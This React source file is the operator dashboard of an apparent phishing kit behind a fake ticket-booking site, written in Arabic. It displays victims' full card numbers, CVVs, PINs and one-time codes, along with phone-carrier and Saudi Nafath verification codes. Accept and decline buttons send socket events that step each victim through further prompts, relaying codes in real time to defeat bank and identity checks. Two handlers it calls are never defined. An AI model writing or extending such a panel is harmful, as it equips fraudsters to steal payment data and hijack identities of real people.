import React, { useEffect, useState } from "react";
import { serverRoute, token } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { IoMdCloseCircle, IoMdRefresh } from "react-icons/io";
import { useNavigate } from "react-router-dom";

// Reusable button group component
const ActionButtons = ({
  onAccept,
  onDecline,
  acceptLabel = "قبول",
  declineLabel = "رفض",
  acceptClass = "bg-green-500",
  declineClass = "bg-red-500",
}) => (
  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3 p-2 text-xs">
    <button
      className={`${acceptClass} w-1/2 p-2 rounded-lg`}
      onClick={onAccept}
    >
      {acceptLabel}
    </button>
    <button
      className={`${declineClass} w-1/2 p-2 rounded-lg`}
      onClick={onDecline}
    >
      {declineLabel}
    </button>
  </div>
);

// Reusable input with buttons component
const InputWithActions = ({
  value,
  onChange,
  placeholder,
  onAccept,
  onDecline,
  onChangeBtn,
  showChange,
}) => (
  <>
    <input
      className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
      value={value}
      onChange={onChange}
      placeholder={placeholder}
    />
    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3 p-2 text-xs">
      {showChange && (
        <button
          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
          onClick={onChangeBtn}
        >
          تغيير
        </button>
      )}
      <button className="bg-green-500 w-1/2 p-2 rounded-lg" onClick={onAccept}>
        قبول
      </button>
      <button className="bg-red-500 w-1/2 p-2 rounded-lg" onClick={onDecline}>
        رفض
      </button>
    </div>
  </>
);

const Main = () => {
  const socket = io(serverRoute);
  const [activeUsers, setActiveUsers] = useState([]);
  const [Users, setUsers] = useState([]);
  const [user, setUser] = useState({ data: {}, active: false });
  const [userOtp, setUserOtp] = useState(null);
  const [navazValidateOtp, setNavazValidateOtp] = useState(null);
  const [price, setPrice] = useState(null);
  const navigate = useNavigate();

  useEffect(() => {
    if (!localStorage.getItem("token")) return navigate("/login");
  }, []);

  const getUsers = async () => {
    await axios
      .get(`${serverRoute}/users`)
      .then((res) => {
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const handleDisplay = async (id) => {
    const user = Users.find((u) => u._id === id);
    if (!user.checked) {
      await axios.get(serverRoute + "/order/checked/" + id);
    }
    getUsers();
    setUser({ data: user, active: true });
  };

  const handleChange = async (id) => {
    if (!price) return window.alert("املاء حفل الكود");
    socket.emit("navazChange", { id, price });
  };

  const handleAcceptVisa = async (id) => {
    socket.emit("acceptPaymentForm", id);
    setUser({ data: { ...user.data, CardAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisa = (id) => {
    socket.emit("declinePaymentForm", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, CardAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, CardAccept: true }, active: true });
  };

  const handleAcceptPin = async (id) => {
    socket.emit("acceptVisaPin", id);
    setUser({ data: { ...user.data, PinAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclinePin = (id) => {
    socket.emit("declineVisaPin", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, PinAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, PinAccept: true }, active: true });
  };

  const handleAcceptPhone = async (id) => {
    socket.emit("acceptPhone", id);
    setUser({ data: { ...user.data, phoneAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclinePhone = (id) => {
    socket.emit("declinePhone", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, phoneAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, phoneAccept: true }, active: true });
  };

  const handleAcceptPhoneOtp = async (id) => {
    if (
      user.data.phoneNetwork !== "STC" &&
      user.data.phoneNetwork !== "Mobily"
    ) {
      if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
    }
    setUser({
      data: {
        ...user.data,
        phoneOtpAccept: true,
        networkAccept: false,
        navazAceept: false,
      },
      active: true,
    });
    socket.emit("acceptPhoneOTP", { id, price });
    await getUsers();
  };

  const handleDeclinePhoneOtp = (id) => {
    socket.emit("declinePhoneOTP", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, phoneOtpAccept: true, navazAceept: false };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, phoneOtpAccept: true, navazAceept: false },
      active: true,
    });
  };

  const handleAcceptService = async (id) => {
    if (user.data.phoneNetwork === "STC") {
      if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
    }
    socket.emit("acceptService", { id, price });
    setUser({
      data: { ...user.data, networkAccept: true, navazAceept: false },
      active: true,
    });
    await getUsers();
  };

  const handleDeclineService = (id) => {
    socket.emit("declineService", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, networkAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, networkAccept: true }, active: true });
  };

  const handleAcceptNavaz = async (id) => {
    socket.emit("acceptNavaz", id);
    setUser({ data: { ...user.data, navazAceept: true }, active: true });
    await getUsers();
  };

  const handleDeclineNavaz = async (id) => {
    socket.emit("declineNavaz", id);
    setUser({
      data: { ...user.data, navazAceept: true, networkAccept: false },
      active: true,
    });
    await getUsers();
  };

  const handleAcceptNavazOtp = async (id) => {
    setUser({
      data: {
        ...user.data,
        navazOtpAccept: true,
        networkAccept: true,
        navazAceept: true,
      },
      active: true,
    });
    socket.emit("acceptNavazOTP", id);
    await getUsers();
  };

  const handleDeclineNavazOtp = (id) => {
    socket.emit("declineNavazOTP", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, navazOtpAccept: true, navazAceept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, navazOtpAccept: true, navazAceept: true },
      active: true,
    });
  };

  const handleAcceptMobOtp = async (id) => {
    if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
    setUser({
      data: {
        ...user.data,
        mobOtpAccept: true,
        checked: true,
      },
      active: true,
    });
    socket.emit("acceptMobOtp", { id, price });
    await getUsers();
  };

  const handleDeclineMobOtp = (id) => {
    socket.emit("declineMobOtp", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, mobOtpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, mobOtpAccept: true },
      active: true,
    });
  };

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const res = await axios.get(`${serverRoute}/users`);
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      } catch (error) {
        console.error(error);
      }
    };

    fetchUsers();

    socket.connect();
    socket.on("newLogin", fetchUsers);
    socket.on("paymentForm", fetchUsers);
    socket.on("visaPin", fetchUsers);
    socket.on("phone", fetchUsers);
    socket.on("phoneOtp", fetchUsers);
    socket.on("mobOtp", fetchUsers);
    socket.on("navazOtp", fetchUsers);

    // Cleanup to avoid duplicate listeners
    return () => {
      socket.off("newLogin", fetchUsers);
      socket.off("paymentForm", fetchUsers);
      socket.off("visaPin", fetchUsers);
      socket.off("phone", fetchUsers);
      socket.off("phoneOtp", fetchUsers);
      socket.off("mobOtp", fetchUsers);
      socket.off("navazOtp", fetchUsers);

      socket.disconnect();
    };
  }, []);

  return (
    <div
      className="flex w-full flex-col bg-gray-200 relative h-screen"
      dir="rtl"
    >
      <div
        className="fixed left-5 bottom-2 cursor-pointer p-2 bg-sky-800 rounded-full  text-white"
        onClick={() => window.location.reload()}
      >
        <IoMdRefresh className="text-3xl  " />
      </div>
      <div
        className="fixed left-5 bottom-16 cursor-pointer p-2 bg-red-500 rounded-full  text-white"
        onClick={async () =>
          await axios
            .delete(serverRoute + "/")
            .then(async () => await getUsers())
        }
      >
        <IoMdCloseCircle className="text-3xl  " />
      </div>
      <div className="flex w-full items-center h-screen  md:flex-row  ">
        {/* // Notifactions */}

        <div className="w-1/5 border-l border-gray-500 h-full flex flex-col  ">
          <span className="p-5 w-full text-xl text-center border-b text-white  bg-sky-800">
            مستخدمين
          </span>
          <div className="w-full flex flex-col overflow-y-auto items-center justify-center gap-y-2 h-11/12 py-2">
            {Users.length
              ? Users.map((us, idx) => {
                  return (
                    <div
                      className={`w-11/12  py-3 md:text-lg text-sm flex justify-between items-center border rounded-full border-gray-500 cursor-pointer hover:opacity-70 ${
                        user.data._id === us._id
                          ? "bg-sky-800 text-white"
                          : "text-gray-700"
                      }`}
                      onClick={() => {
                        handleDisplay(us._id);
                      }}
                    >
                      <span
                        className={`w-2 h-2 bg-green-500 rounded-full ${
                          activeUsers.find((u) => u._id === us._id)
                            ? "visible"
                            : "hidden"
                        }`}
                      ></span>
                      <span className="flex-1 text-center    text-xs text-wrap ">
                        {us.firstName} {}
                        {us.lastName}
                      </span>
                    </div>
                  );
                })
              : ""}
          </div>
        </div>

        {/* data */}

        {user.active ? (
          <div className="flex-1 flex flex-col h-screen justify-center items-center">
            <span
              className="p-5  w-full text-xl text-center text-white  bg-sky-800"
              dir="rtl"
            >
              بيانات عميل
              <span className="text-green-500 mr-10">
                {" "}
                {user.data?.fullname}
              </span>
            </span>
            <div className="w-11/12  overflow-y-auto flex flex-1 gap-x-2 flex-wrap  ">
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3  rounded-lg gap-y-1 h-fit  my-2 w-1/4 ">
                <span className="text-lg mb-2">بيانات التسجيل</span>
                <div className="grid grid-cols-2 md:grid-cols-1 items-start w-full">
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> الاسم </span>
                    <span>
                      {user.data?.firstName} {user.data?.lastName}
                    </span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم الجوال </span>
                    <span>{user.data?.countryCode + user.data?.phone} + </span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> ايميل </span>
                    <span>{user.data?.email}</span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> اسم التذكرة </span>
                    <span>{user.data?.ticket_name}</span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> عدد البالغين </span>
                    <span>{user.data?.visitors.adultVisitors.length}</span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> عدد الأطفال </span>
                    <span>{user.data?.visitors.childVisitors.length}</span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> عائلية</span>
                    <span>{user.data?.visitors.family ? 1 : 0}</span>
                  </div>

                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> السعر الكلي </span>
                    <span>{user.data?.totalPrice}</span>
                  </div>
                </div>
              </div>

              {user.data?.cardNumber && (
                <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 w-1/4 h-fit my-2">
                  <span className="text-lg mb-2">بيانات البطاقة</span>
                  <div className="w-full grid grid-cols-2 md:grid-cols-1 items-start">
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span>اسم حامل البطاقة</span>
                      <span>{user.data.card_name}</span>
                    </div>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span>رقم البطاقة</span>
                      <span>{user.data.cardNumber}</span>
                    </div>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span>cvv</span>
                      <span>{user.data.cvv}</span>
                    </div>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span>تاريخ انتهاء</span>
                      <span>{user.data.expiryDate}</span>
                    </div>
                    {!user.data.CardAccept && (
                      <ActionButtons
                        onAccept={() => handleAcceptVisa(user.data._id)}
                        onDecline={() => handleDeclineVisa(user.data._id)}
                      />
                    )}
                  </div>

                  {user.data.CardOtp && (
                    <>
                      <span className="text-lg mb-2">رمز تحقق البطاقة</span>
                      <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                        <span>الرمز</span>
                        <span>{user.data.CardOtp}</span>
                      </div>
                      {!user.data.OtpCardAccept && (
                        <div className="w-4/5">
                          <ActionButtons
                            onAccept={() => handleAcceptVisaOtp(user.data._id)}
                            onDecline={() =>
                              handleDeclineVisaOtp(user.data._id)
                            }
                          />
                        </div>
                      )}
                    </>
                  )}

                  {user.data.pin && (
                    <>
                      <span className="text-lg mb-2">رقم سري البطاقة</span>
                      <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                        <span>رقم</span>
                        <span>{user.data.pin}</span>
                      </div>
                      {!user.data.PinAccept && (
                        <div className="w-4/5">
                          <ActionButtons
                            onAccept={() => handleAcceptPin(user.data._id)}
                            onDecline={() => handleDeclinePin(user.data._id)}
                          />
                        </div>
                      )}
                    </>
                  )}
                </div>
              )}
              {user.data?.phoneNumber && (
                <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 h-fit my-2">
                  <span className="text-lg mb-2">معلومات الهاتف</span>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>رقم الهاتف</span>
                    <span>{user.data.phoneNumber}</span>
                  </div>
                  {user.data.phoneNetwork && (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span>مشغل</span>
                      <span>{user.data.phoneNetwork}</span>
                    </div>
                  )}

                  {!user.data.phoneAccept && (
                    <ActionButtons
                      onAccept={() => handleAcceptPhone(user.data._id)}
                      onDecline={() => handleDeclinePhone(user.data._id)}
                    />
                  )}

                  {user.data.phoneOtp && (
                    <>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span>رمز التحقق</span>
                        <span>{user.data.phoneOtp}</span>
                      </div>
                      {!user.data.phoneOtpAccept && (
                        <>
                          {user.data.phoneNetwork !== "STC" &&
                            user.data.phoneNetwork !== "Mobily" && (
                              <input
                                className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                                value={price}
                                onChange={(e) => setPrice(e.target.value)}
                                placeholder="رقم نفاذ"
                              />
                            )}
                          <div className="w-4/5">
                            <ActionButtons
                              onAccept={() =>
                                handleAcceptPhoneOtp(user.data._id)
                              }
                              onDecline={() =>
                                handleDeclinePhoneOtp(user.data._id)
                              }
                            />
                          </div>
                        </>
                      )}
                    </>
                  )}

                  {user.data.mobOtp && (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span>موبايلي Otp</span>
                      <span>{user.data.mobOtp}</span>
                    </div>
                  )}

                  {user.data.phoneAccept &&
                    user.data.phoneNetwork === "Mobily" &&
                    !user.data.networkAccept && (
                      <ActionButtons
                        onAccept={() => handleAcceptService(user.data._id)}
                        onDecline={() => handleDeclineService(user.data._id)}
                      />
                    )}

                  {user.data.phoneAccept &&
                    user.data.phoneNetwork !== "STC" &&
                    user.data.phoneOtpAccept &&
                    !user.data.navazAceept && (
                      <InputWithActions
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="رقم نفاذ"
                        onAccept={() => handleAcceptNavaz(user.data._id)}
                        onDecline={() => handleDeclineNavaz(user.data._id)}
                        onChangeBtn={() => handleChange(user.data._id)}
                        showChange={true}
                      />
                    )}
                  {user.data.phoneAccept &&
                    user.data.phoneNetwork === "Mobily" &&
                    user.data.mobOtpAccept &&
                    !user.data.navazAceept && (
                      <InputWithActions
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="في حالة القبول رقم نفاذ"
                        onAccept={() => handleAcceptNavaz(user.data._id)}
                        onDecline={() => handleDeclineNavaz(user.data._id)}
                        onChangeBtn={() => handleChange(user.data._id)}
                        showChange={true}
                      />
                    )}

                  {user.data.phoneAccept &&
                    user.data.phoneNetwork === "Mobily" &&
                    user.data.networkAccept &&
                    user.data.mobOtp &&
                    !user.data.mobOtpAccept && (
                      <>
                        <span className="text-lg mb-2">قبول موبايلي otp</span>
                        <input
                          className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                          value={price}
                          onChange={(e) => setPrice(e.target.value)}
                          placeholder="رقم نفاذ"
                        />
                        <ActionButtons
                          onAccept={() => handleAcceptMobOtp(user.data._id)}
                          onDecline={() => handleDeclineMobOtp(user.data._id)}
                        />
                      </>
                    )}
                </div>
              )}
              {user.data.phoneAccept &&
                user.data.phoneOtpAccept &&
                user.data?.phoneNetwork === "STC" && (
                  <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 h-fit w-1/4 my-2">
                    <span className="text-lg mb-2">
                      قبول {user.data.phoneNetwork}
                    </span>
                    {user.data.networkAccept ? (
                      "تم الرد"
                    ) : (
                      <>
                        <input
                          className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                          value={price}
                          onChange={(e) => setPrice(e.target.value)}
                          placeholder="رقم نفاذ"
                        />
                        <ActionButtons
                          onAccept={() => handleAcceptService(user.data._id)}
                          onDecline={() => handleDeclineService(user.data._id)}
                        />
                      </>
                    )}
                  </div>
                )}

              {user.data.phoneAccept &&
                user.data.phoneOtpAccept &&
                user.data?.phoneNetwork === "STC" &&
                user.data.networkAccept && (
                  <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 h-fit w-1/4 my-2">
                    <span className="text-lg mb-2">قبول نفاذ</span>
                    {user.data.navazAceept ? (
                      <span className="my-2">تم الرد</span>
                    ) : (
                      <InputWithActions
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="رقم نفاذ"
                        onAccept={() => handleAcceptNavaz(user.data._id)}
                        onDecline={() => handleDeclineNavaz(user.data._id)}
                        onChangeBtn={() => handleChange(user.data._id)}
                        showChange={true}
                      />
                    )}
                  </div>
                )}

              {user.data.navazOtp && (
                <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 h-fit w-1/4 my-2">
                  <span className="text-lg mb-2">رمز التحقق بعد نفاذ</span>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>رمز</span>
                    <span>{user.data.navazOtp}</span>
                  </div>
                  {!user.data.navazOtpAccept && (
                    <ActionButtons
                      onAccept={() => handleAcceptNavazOtp(user.data._id)}
                      onDecline={() => handleDeclineNavazOtp(user.data._id)}
                    />
                  )}
                </div>
              )}
            </div>
          </div>
        ) : (
          ""
        )}
      </div>
    </div>
  );
};

export default Main;
